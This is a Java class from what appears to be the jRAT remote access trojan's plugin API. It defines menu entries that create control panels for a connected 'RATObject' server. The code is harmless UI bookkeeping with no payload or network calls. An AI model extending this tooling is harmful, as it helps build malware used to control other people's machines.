package jrat.api;

import java.util.HashMap;
import java.util.Map;

import javax.swing.ImageIcon;

public final class RATControlMenuEntry {

	private String name;
	private Class<? extends BaseControlPanel> panel;
	private ImageIcon icon;

	/**
	 * Instances of this panel with a RATObject
	 */
	private final Map<String, BaseControlPanel> instances = new HashMap<String, BaseControlPanel>();

	public RATControlMenuEntry(String name, Class<? extends BaseControlPanel> panel) {
		this(name, null, panel);
	}

	public RATControlMenuEntry(String name, ImageIcon icon, Class<? extends BaseControlPanel> panel) {
		this.name = name;
		this.panel = panel;
		this.icon = icon;
	}
	
	public Map<String, BaseControlPanel> getInstances() {
		return instances;
	}

	/**
	 * 
	 * @return Returns the icon
	 */

	public ImageIcon getIcon() {
		return icon;
	}

	/**
	 * 
	 * @return Returns the name
	 */

	public String getName() {
		return name;
	}

	/**
	 * 
	 * @return Returns the class of the panel
	 */

	public Class<? extends BaseControlPanel> getPanel() {
		return panel;
	}

	/**
	 * 
	 * @param server
	 * @return Returns a new instance of the panel with the specified server as
	 *         server
	 * @throws Exception
	 */

	public BaseControlPanel newPanelInstance(RATObject server) throws Exception {
		BaseControlPanel p = panel.newInstance();
		p.setServer(server);
		return p;
	}

}
